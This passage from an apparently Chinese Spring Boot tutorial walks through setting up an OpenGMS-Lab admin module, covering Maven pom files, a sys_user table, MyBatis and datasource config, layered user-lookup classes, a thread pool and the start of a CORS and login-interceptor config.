\u0026lt;modelVersion\u0026gt;4.0.0\u0026lt;/modelVersion\u0026gt; \u0026lt;artifactId\u0026gt;lab-admin\u0026lt;/artifactId\u0026gt; \u0026lt;description\u0026gt; 管理模块 \u0026lt;/description\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;maven.compiler.source\u0026gt;8\u0026lt;/maven.compiler.source\u0026gt; \u0026lt;maven.compiler.target\u0026gt;8\u0026lt;/maven.compiler.target\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;!-- spring-boot-devtools --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;spring-boot-devtools\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;optional\u0026gt;true\u0026lt;/optional\u0026gt; \u0026amp;lt;!\u0026amp;ndash; 表示依赖不会传递 \u0026amp;ndash;\u0026amp;gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;!-- SpringBoot Web容器 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;!--以下是排除的组件--\u0026gt; \u0026lt;exclusions\u0026gt; \u0026lt;!--排除默认自带的log组件--\u0026gt; \u0026lt;exclusion\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-logging\u0026lt;/artifactId\u0026gt; \u0026lt;/exclusion\u0026gt; \u0026lt;/exclusions\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--log4j2日志相关 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-log4j2\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- SpringBoot yml配置文件编写智能提示 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-configuration-processor\u0026lt;/artifactId\u0026gt; \u0026lt;optional\u0026gt;true\u0026lt;/optional\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- pagehelper 分页插件 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.pagehelper\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;pagehelper-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--mysql驱动 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--自动生成实体类get/set方法--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.projectlombok\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;lombok\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--项目common通用工具类 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.opengms\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;lab-common\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.0.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- SpringBoot 拦截器 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-aop\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- 阿里数据库连接池 --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;druid-spring-boot-starter\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;!-- 验证码 --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;com.github.penggle\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;kaptcha\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;exclusions\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;exclusion\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;javax.servlet-api\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;javax.servlet\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;/exclusion\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;/exclusions\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;!-- 获取系统信息 --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;com.github.oshi\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;oshi-core\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;build\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-maven-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.1.1.RELEASE\u0026lt;/version\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;fork\u0026gt;true\u0026lt;/fork\u0026gt; \u0026lt;!-- 如果没有该配置，devtools不会生效 --\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;executions\u0026gt; \u0026lt;execution\u0026gt; \u0026lt;!--打成可执行的运行包（.jar .war）--\u0026gt; \u0026lt;goals\u0026gt; \u0026lt;goal\u0026gt;repackage\u0026lt;/goal\u0026gt; \u0026lt;/goals\u0026gt; \u0026lt;/execution\u0026gt; \u0026lt;/executions\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.apache.maven.plugins\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;maven-war-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.1.0\u0026lt;/version\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;failOnMissingWebXml\u0026gt;false\u0026lt;/failOnMissingWebXml\u0026gt; \u0026lt;warName\u0026gt;${project.artifactId}\u0026lt;/warName\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;finalName\u0026gt;${project.artifactId}\u0026lt;/finalName\u0026gt; \u0026lt;/build\u0026gt; \u0026lt;/project\u0026gt; lab-common的pom文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;project xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;parent\u0026gt; \u0026lt;artifactId\u0026gt;opengms\u0026lt;/artifactId\u0026gt; \u0026lt;groupId\u0026gt;org.opengms\u0026lt;/groupId\u0026gt; \u0026lt;version\u0026gt;1.0.0\u0026lt;/version\u0026gt; \u0026lt;/parent\u0026gt; \u0026lt;modelVersion\u0026gt;4.0.0\u0026lt;/modelVersion\u0026gt; \u0026lt;artifactId\u0026gt;lab-common\u0026lt;/artifactId\u0026gt; \u0026lt;description\u0026gt; common通用工具 \u0026lt;/description\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;maven.compiler.source\u0026gt;8\u0026lt;/maven.compiler.source\u0026gt; \u0026lt;maven.compiler.target\u0026gt;8\u0026lt;/maven.compiler.target\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;!-- Spring框架基本的核心工具 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-context-support\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- SpringWeb模块 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-web\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- spring security 安全认证 --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;spring-boot-starter-security\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;!-- 自定义验证注解 --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;spring-boot-starter-validation\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;!--常用工具类 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.commons\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-lang3\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- JSON工具类 --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;com.fasterxml.jackson.core\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;jackson-databind\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;!-- 阿里JSON解析器 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.fastjson2\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson2\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- io常用工具类 --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;commons-io\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;commons-io\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;!-- 文件上传工具类 --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;commons-fileupload\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;commons-fileupload\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;!-- excel工具 --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;org.apache.poi\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;poi-ooxml\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;!-- yml解析器 --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;org.yaml\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;snakeyaml\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;!--Token生成与解析--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;io.jsonwebtoken\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jjwt\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- Jaxb --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;javax.xml.bind\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;jaxb-api\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;!-- redis 缓存操作 --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;spring-boot-starter-data-redis\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;!-- pool 对象池 --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;org.apache.commons\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;commons-pool2\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;!-- 解析客户端操作系统、浏览器等 --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;eu.bitwalker\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;UserAgentUtils\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;!-- servlet包 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;javax.servlet\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javax.servlet-api\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;/project\u0026gt; 初始化admin模块 1. 添加依赖 上一节已添加\n**父项目：**引入pagehelper-spring-boot-starter（后面分页实现使用的分页插件），并规定版本号。\npagehelper-spring-boot-starter内含依赖：(主要是有整合mybatis的驱动mybatis-spring-boot-starter，引入它就可以不用再声明引入mybatis驱动)，如下图：\n1 2 3 4 5 6 \u0026lt;!-- pagehelper 分页插件 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.pagehelper\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;pagehelper-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${pagehelper.boot.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; lab-admin\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;!-- pagehelper 分页插件 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.pagehelper\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;pagehelper-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--mysql驱动 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 2. 准备数据库表 建库：\n建表：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 -- ---------------------------- -- 用户信息表 -- ---------------------------- drop table if exists sys_user; create table sys_user ( user_id bigint(20) not null auto_increment comment \u0026#39;用户ID\u0026#39;, user_name varchar(30) not null comment \u0026#39;用户名\u0026#39;, user_type varchar(2) default \u0026#39;00\u0026#39; comment \u0026#39;用户类型（00系统用户）\u0026#39;, email varchar(50) default \u0026#39;\u0026#39; comment \u0026#39;用户邮箱\u0026#39;, phonenumber varchar(11) default \u0026#39;\u0026#39; comment \u0026#39;手机号码\u0026#39;, sex char(1) default \u0026#39;0\u0026#39; comment \u0026#39;用户性别（0男 1女 2未知）\u0026#39;, avatar varchar(100) default \u0026#39;\u0026#39; comment \u0026#39;头像地址\u0026#39;, password varchar(100) default \u0026#39;\u0026#39; comment \u0026#39;密码\u0026#39;, login_ip varchar(128) default \u0026#39;\u0026#39; comment \u0026#39;最后登录IP\u0026#39;, login_date datetime comment \u0026#39;最后登录时间\u0026#39;, create_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;创建者\u0026#39;, create_time datetime comment \u0026#39;创建时间\u0026#39;, update_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;更新者\u0026#39;, update_time datetime comment \u0026#39;更新时间\u0026#39;, remark varchar(500) default null comment \u0026#39;备注\u0026#39;, primary key (user_id) ) engine=innodb auto_increment=100 comment = \u0026#39;用户信息表\u0026#39;; insert into sys_user (user_id, user_name, email, phonenumber) values(1, \u0026#39;阿彬\u0026#39;, \u0026#39;7b@163.com\u0026#39;, \u0026#39;15888888888\u0026#39;); 3. 整合mybatis等初始化配置 application.yml配置文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 # 项目相关配置 lab: # 名称 name: OpenGMS-Lab # 版本 version: 1.0.0 # 版权年份 copyrightYear: 2022 # 文件路径 示例（ Windows配置E:/opengms-lab/uploadPath，Linux配置 /home/opengms-lab/uploadPath） # profile: E:/opengms-lab/uploadPath # 验证码类型 math 数组计算 char 字符验证 captchaType: math # 开发环境配置 server: # 服务器的HTTP端口，默认为8080 port: 8888 spring: profiles: active: dev datasource: name: lab_datasource url: jdbc:mysql://127.0.0.1:3306/opengms_lab?useUnicode=true\u0026amp;characterEncoding=utf8\u0026amp;autoReconnect=true\u0026amp;useSSL=false\u0026amp;serverTimezone=Asia/Shanghai driver-class-name: com.mysql.cj.jdbc.Driver username: root password: 123456 # MyBatis配置 mybatis: # 搜索指定包别名 typeAliasesPackage: org.opengms.**.entity.po # 配置mapper的扫描，找到所有的mapper.xml映射文件 mapperLocations: classpath*:mapper/**/*Mapper.xml # 加载全局的配置文件 configLocation: classpath:mybatis/mybatis-config.xml application-dev.yml配置文件：\n1 2 lab: profile: E:/opengms-lab/uploadPath mybatils配置文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt; \u0026lt;!DOCTYPE configuration PUBLIC \u0026#34;-//mybatis.org//DTD Config 3.0//EN\u0026#34; \u0026#34;http://mybatis.org/dtd/mybatis-3-config.dtd\u0026#34;\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;!-- 全局参数 --\u0026gt; \u0026lt;settings\u0026gt; \u0026lt;!-- 使全局的映射器启用或禁用缓存 --\u0026gt; \u0026lt;setting name=\u0026#34;cacheEnabled\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;!-- 允许JDBC 支持自动生成主键 --\u0026gt; \u0026lt;setting name=\u0026#34;useGeneratedKeys\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;!-- 配置默认的执行器.SIMPLE就是普通执行器;REUSE执行器会重用预处理语句(prepared statements);BATCH执行器将重用语句并执行批量更新 --\u0026gt; \u0026lt;setting name=\u0026#34;defaultExecutorType\u0026#34; value=\u0026#34;SIMPLE\u0026#34; /\u0026gt; \u0026lt;!-- 指定 MyBatis 所用日志的具体实现 --\u0026gt; \u0026lt;setting name=\u0026#34;logImpl\u0026#34; value=\u0026#34;SLF4J\u0026#34; /\u0026gt; \u0026lt;!-- 使用驼峰命名法转换字段 --\u0026gt; \u0026lt;setting name=\u0026#34;mapUnderscoreToCamelCase\u0026#34; value=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;/settings\u0026gt; \u0026lt;/configuration\u0026gt; 1.default-executor-type详解：https://blog.csdn.net/fengshuiyue/article/details/89222654\n2.use-generated-keys详解：https://blog.csdn.net/u012060033/article/details/79948353\n就是\n3.cache-enabled详解：https://blog.csdn.net/canot/article/details/51491732\n缓存暂时没用到，后面整合redis后用redis做缓存。\n4. 创建各层测试 一、User实体类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 @Data public class User { private static final long serialVersionUID = 1L; /** 用户ID */ private Long userId; /** 用户名 */ private String userName; /** 用户邮箱 */ private String email; /** 手机号码 */ private String phonenumber; } 二、controller层\nUserController\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 @RestController @RequestMapping(\u0026#34;/user\u0026#34;) public class UserController { @Autowired IUserService userService; @GetMapping(value = \u0026#34;/{userId}\u0026#34; ) public User selectUserById(@PathVariable(value = \u0026#34;userId\u0026#34;) Long userId){ // Long userId = 101L; return userService.selectUserById(userId); } } 三、service层\nIUserService\n1 2 3 public interface IUserService { User selectUserById(Long userId); } UserServiceImpl\n1 2 3 4 5 6 7 8 9 10 11 @Service public class UserServiceImpl implements IUserService { @Autowired private UserMapper userMapper; @Override public User selectUserById(Long userId) { return userMapper.selectUserById(userId); } } 四、dao层\nUserMapper\n1 2 3 4 5 6 @Mapper public interface UserMapper { User selectUserById(Long userId); } UserMapper.xml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt; \u0026lt;!DOCTYPE mapper PUBLIC \u0026#34;-//mybatis.org//DTD Mapper 3.0//EN\u0026#34; \u0026#34;http://mybatis.org/dtd/mybatis-3-mapper.dtd\u0026#34;\u0026gt; \u0026lt;mapper namespace=\u0026#34;org.opengms.admin.mapper.UserMapper\u0026#34;\u0026gt; \u0026lt;resultMap type=\u0026#34;User\u0026#34; id=\u0026#34;UserResult\u0026#34;\u0026gt; \u0026lt;result property=\u0026#34;userId\u0026#34; column=\u0026#34;user_id\u0026#34; /\u0026gt; \u0026lt;result property=\u0026#34;userName\u0026#34; column=\u0026#34;user_name\u0026#34; /\u0026gt; \u0026lt;result property=\u0026#34;email\u0026#34; column=\u0026#34;email\u0026#34; /\u0026gt; \u0026lt;result property=\u0026#34;phonenumber\u0026#34; column=\u0026#34;phonenumber\u0026#34; /\u0026gt; \u0026lt;/resultMap\u0026gt; \u0026lt;select id=\u0026#34;selectUserById\u0026#34; parameterType=\u0026#34;Long\u0026#34; resultMap=\u0026#34;UserResult\u0026#34;\u0026gt; select user_id, user_name, email, phonenumber from sys_user as u where u.user_id = #{userId} \u0026lt;/select\u0026gt; \u0026lt;/mapper\u0026gt; 5. 启动日志 banner.txt\nhttps://www.bootschool.net/ascii\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 Application Version: ${lab.version} Spring Boot Version: ${spring-boot.version} //////////////////////////////////////////////////////////////////// // _ooOoo_ // // o8888888o // // 88\u0026#34; . \u0026#34;88 // // (| ^_^ |) // // O\\ = /O // // ____/`---\u0026#39;\\____ // // .\u0026#39; \\\\| |// `. // // / \\\\||| : |||// \\ // // / _||||| -:- |||||- \\ // // | | \\\\\\ - /// | | // // | \\_| \u0026#39;\u0026#39;\\---/\u0026#39;\u0026#39; | | // // \\ .-\\__ `-` ___/-. / // // ___`. .\u0026#39; /--.--\\ `. . ___ // // .\u0026#34;\u0026#34; \u0026#39;\u0026lt; `.___\\_\u0026lt;|\u0026gt;_/___.\u0026#39; \u0026gt;\u0026#39;\u0026#34;\u0026#34;. // // | | : `- \\`.;`\\ _ /`;.`/ - ` : | | // // \\ \\ `-. \\_ __\\ /__ _/ .-` / / // // ========`-.____`-.___\\_____/___.-`____.-\u0026#39;======== // // `=---=\u0026#39; // // ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ // // 佛祖保佑 永不宕机 永无BUG // //////////////////////////////////////////////////////////////////// ____ _____ __ __ _____ _ _ / __ \\ / ____| \\/ |/ ____| | | | | | | | |_ __ ___ _ __ | | __| \\ / | (___ | | __ _| |__ | | | | \u0026#39;_ \\ / _ \\ \u0026#39;_ \\| | |_ | |\\/| |\\___ \\ | | / _` | \u0026#39;_ \\ | |__| | |_) | __/ | | | |__| | | | |____) | | |___| (_| | |_) | \\____/| .__/ \\___|_| |_|\\_____|_| |_|_____/ |______\\__,_|_.__/ | | |_| 6. 读取项目相关配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 @Component @ConfigurationProperties(prefix = \u0026#34;lab\u0026#34;) public class LabConfig { /** 项目名称 */ private String name; /** 版本 */ private String version; /** 版权年份 */ private String copyrightYear; /** 上传路径 */ private static String profile; /** 验证码类型 */ private static String captchaType; } 7. 直接拷贝lab-common整个模块并在admin中引入 lab-admin的pom文件：\n1 2 3 4 5 6 \u0026lt;!--项目common通用工具类 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.opengms\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;lab-common\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.0.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 线程配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 @Configuration @EnableScheduling //同步 @EnableAsync //异步 public class ScheduleConfig { @Bean public TaskExecutor taskExecutor() { ThreadPoolTaskExecutor executor = new ThreadPoolTaskExecutor(); // 设置核心线程数 核心线程数线程数定义了最小可以同时运行的线程数量 executor.setCorePoolSize(3); // 设置最大线程数 当队列中存放的任务达到队列容量的时候，当前可以同时运行的线程数量变为最大线程数 executor.setMaxPoolSize(5); // 设置队列容量 当新任务来的时候会先判断当前运行的线程数量是否达到核心线程数，如果达到的话，信任就会被存放在队列中 executor.setQueueCapacity(200); // 设置线程活跃时间（秒） executor.setKeepAliveSeconds(60); // 设置默认线程名称 executor.setThreadNamePrefix(\u0026#34;AsyncThread-\u0026#34;); // 设置拒绝策略 当最大池被填满时，此策略为我们提供可伸缩队列 executor.setRejectedExecutionHandler(new ThreadPoolExecutor.CallerRunsPolicy()); // 等待所有任务结束后再关闭线程池 executor.setWaitForTasksToCompleteOnShutdown(true); return executor; } } 跨域、登录验证、全局异常配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 @Configuration public class WebConfig implements WebMvcConfigurer{ //解决跨域问题 @Override public void addCorsMappings(CorsRegistry registry) { registry.addMapping(\u0026#34;/**\u0026#34;); //允许远端访问的域名 // .allowedOrigins(\u0026#34;http://localhost:8099\u0026#34;) //允许请求的方法(\u0026#34;POST\u0026#34;, \u0026#34;GET\u0026#34;, \u0026#34;PUT\u0026#34;, \u0026#34;OPTIONS\u0026#34;, \u0026#34;DELETE\u0026#34;) // .allowedMethods(\u0026#34;*\u0026#34;) //允许请求头 // .allowedHeaders(\u0026#34;*\u0026#34;); } //登录请求问题 @Override public void addInterceptors(InterceptorRegistry registry) { /** * kn4j 在想文档相关的资源 需要放开 */ String[] swaggerPatterns = { \u0026#34;/swagger-resources/**\u0026#34;, \u0026#34;/webjars/**\u0026#34;, \u0026#34;/v2/**\u0026#34;, \u0026#34;/swagger-ui.html/**\u0026#34;, \u0026#34;/doc.html/**\u0026#34; }; registry.addInterceptor(authenticationInterceptor()) .excludePathPatterns(swaggerPatterns) .addPathPatterns(\u0026#34;/**\u0026#34;); // 